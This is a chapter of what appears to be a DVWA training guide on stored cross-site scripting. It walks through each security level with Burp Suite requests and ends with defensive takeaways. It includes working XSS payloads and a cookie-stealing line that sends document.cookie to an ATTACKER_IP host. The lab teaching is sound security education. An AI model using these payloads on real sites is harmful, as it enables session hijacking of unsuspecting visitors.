# Chapter 11 — XSS Stored (DVWA Module: XSS (Stored))

## Objective
Inject persistent JavaScript into DVWA's guestbook so it executes for **every visitor** who views the page, and build a Burp-hosted cookie-stealing payload.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/xss_s/`
- Form fields: `txtName` (Name) and `mtxMessage` (Message)

---

## 🟢 LOW

### Source logic
```php
$name = $_POST[ 'txtName' ];
$message = $_POST[ 'mtxMessage' ];
$query = "INSERT INTO guestbook (comment, name) VALUES ('$message','$name');";
// Output later: echo $name; echo $message;  (no escaping on output either)
```
No sanitization on input **or** output; data is persisted to the database and re-rendered for all visitors.

### Burp Suite steps
1. Capture the guestbook POST in Proxy, send to Repeater.
2. Payload in the **Message** field:
   ```
   mtxMessage=<script>alert('Stored XSS')</script>&txtName=test&btnSign=Sign+Guestbook
   ```
3. Send — then visit `http://localhost/dvwa/vulnerabilities/xss_s/` in the browser (no Repeater needed now) — the alert fires **every time the page loads**, for any user, without re-submitting anything.
4. **Cookie theft PoC** (persistent):
   ```
   mtxMessage=<script>new Image().src='http://ATTACKER_IP:9000/steal?c='+document.cookie</script>
   ```
   Any future visitor (including an "admin" browsing in your lab) triggers exfiltration automatically.

### Why it works
Same missing-output-encoding flaw as reflected XSS, but the payload is **persisted server-side** — so it impacts every future viewer of the page, not just the one request, making it significantly more dangerous (worm-like propagation potential, admin session theft, etc.).

---

## 🟡 MEDIUM

### Source logic
```php
$name = str_replace( '<script>', '', $_POST[ 'txtName' ] );
$message = strip_tags( addslashes( $_POST[ 'mtxMessage' ] ), '<b><i>' );
```
`$message` runs through `strip_tags()` allowing only `<b>` and `<i>`; `$name` only strips literal `<script>`.

### Burp Suite bypass
The **Message** field is fairly well protected by `strip_tags()`, but the **Name** field (`txtName`) has the field weaker `<script>`-only blacklist, same as Reflected-XSS Medium:
```
txtName=<img src=x onerror=alert(document.cookie)>
txtName=<svg onload=alert(1)>
```
Also test the Name field's max-length client-side attribute (`maxlength` in HTML) — irrelevant since Burp submits raw POST data regardless of HTML input constraints.

### Why the bypass works
`strip_tags()` on the Message field is comparatively strong (whitelists only 2 harmless tags), but the **Name** field reuses the weak `<script>`-string blacklist from Reflected XSS — inconsistent sanitization between fields creates the exploitable gap.

---

## 🔴 HIGH

### Source logic
```php
$name = str_replace( '<script>', '', $_POST[ 'txtName' ] );  // same weak filter, name field length also capped via maxlength="10" client-side only
$message = strip_tags( addslashes( $_POST[ 'mtxMessage' ] ), '<b><i>' );
```
DVWA High is largely identical to Medium for this module (the module is one of the less-differentiated across levels) — the **Name field's `maxlength="10"`** is a client-side-only restriction.

### Burp Suite bypass
1. Intercept the POST in Burp before submission; edit `txtName` to exceed 10 characters and include a payload:
   ```
   txtName=<img src=x onerror=alert(1)>
   ```
2. Since `maxlength` is purely an HTML attribute enforced by the browser's input widget, Burp (which crafts the raw request) is unaffected by it — confirming client-side restrictions are not security controls.

### Why it's still risky
Relying on an HTML attribute (`maxlength`) for security is a client-side control an attacker using any HTTP client (Burp, curl, custom scripts) simply ignores.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
$name = htmlspecialchars( $_POST[ 'txtName' ], ENT_QUOTES );  // AND truncated server-side to a safe length via substr()
$message = htmlspecialchars( $_POST[ 'mtxMessage' ], ENT_QUOTES );
// Parameterized INSERT query; CSRF token required
```

### Why the attack fails
Every character with HTML significance is entity-encoded **before** storage-and-redisplay, on **both** fields consistently, and length limits are enforced **server-side**. Regardless of which HTML tag, attribute, or event handler is attempted, it's rendered as inert text.

### Burp Suite exercise
Submit every earlier payload against Impossible; view the guestbook — payloads appear as literal escaped text (e.g., `&lt;img src=x onerror=alert(1)&gt;`), confirming no script execution.

---

## Root Cause Analysis
Stored XSS shares reflected XSS's core flaw (missing output encoding) but with a persistence layer that multiplies impact across all future viewers. Inconsistent sanitization across form fields (as seen in Medium/High) is a common real-world source of bypasses — a single unprotected field undermines an otherwise reasonable filter elsewhere.

## Defensive Takeaways
- Apply **output encoding consistently** across every field/context that's rendered back to users — audit *all* fields, not just the "obviously risky" one.
- Enforce length/format limits **server-side**, never rely on HTML attributes like `maxlength`.
- Use a strict allow-list for any rich-text fields (e.g., a sanitizer library like DOMPurify server-side/HTML Purifier) rather than ad-hoc `strip_tags()`.
- Combine with CSP and `HttpOnly` cookies as defense-in-depth.

---
⬅ [Back: XSS Reflected](10-xss-reflected.md) | ➡ [Next: XSS DOM](12-xss-dom.md)
